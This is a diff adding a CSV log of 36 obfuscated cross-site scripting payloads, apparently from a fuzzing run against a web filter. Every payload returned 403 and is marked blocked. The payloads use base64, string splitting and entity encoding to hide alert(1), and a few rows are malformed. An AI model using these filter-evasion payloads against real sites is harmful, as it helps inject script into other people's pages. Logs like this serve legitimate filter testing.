@@ -1,0 +1,37 @@
+id,payload,status,response_size,blocked
+0,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+1,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+2,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+3,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+4,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+5,<details open ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
+6,<details open ontoggle=top['al'+'ert']`1`>,403,146,True
+7,"<iframe srcdoc=""&lt;script&gt;parent[&#x61;&#x6c;&#x65;&#x72;&#x74;](1)&lt;/script&gt;"">",403,146,True
+8,"<iframe srcdoc=""&#60;img src=x onerror=top['al'+'ert']`1`>&#62;"">",403,146,True
+9,<details ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
+10,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+11,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+12,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+13,"<iframe srcdoc=""&lt;img src=x onerror=eval(atob`YWxlcnQoMSk`)&gt;"">",403,146,True
+14,"<iframe srcdoc=""&lt;script&gt;parent.alert(1)&lt;/script&gt;"">",403,146,True
+15,<details ontoggle=top['al'+'ert']`1` open>,403,146,True
+16,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+17,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+18,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+19,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+20,<iframe srcdoc='<script>parent[`al`+`ert`](1)</script>'>,403,146,True
+21,"<details ontoggle=""top['al'+'ert']`1`""><summary>x</summary>",403,146,True
+22,<details ontoggle=top['al'+'ert']`1` open>,403,146,True
+23,<iframe srcdoc='<script>parent[&#x27;al&#x27;+&#x27;ert&#x27;](1)</script>'>,403,146,True
+24,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+25,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+26,<details ontoggle=top['al'+'ert']`1` open><summary>x</summary>,403,146,True
+27,<iframe srcdoc='&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;'></iframe>,403,146,True
+28,<iframe srcdoc='<script>parent[&#x27;al&#x27;+&#x27;ert&#x27;+&#x27;(&#x27;1&#x27;)&#x27;+&#x27;]&#x27;()&#x27;</script>'>,403,146,True
+29,<iframe srcdoc='<script>parent.alert(1)</script>'>,403,146,True
+30,<svg onload=eval(atob`YWxlcnQoMSk`)>,403,146,True
+31,"<details ontoggle=""top['al'+'ert']`1`""><summary>x</summary>",403,146,True
+32,<details open ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
+33,<details ontoggle=eval(atob`YWxlcnQoMSk`)>,403,146,True
+34,<iframe srcdoc='<svg onload=eval(atob`YWxlcnQoMSk`)>`.,403,146,True
+35,"<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'>",403,146,True
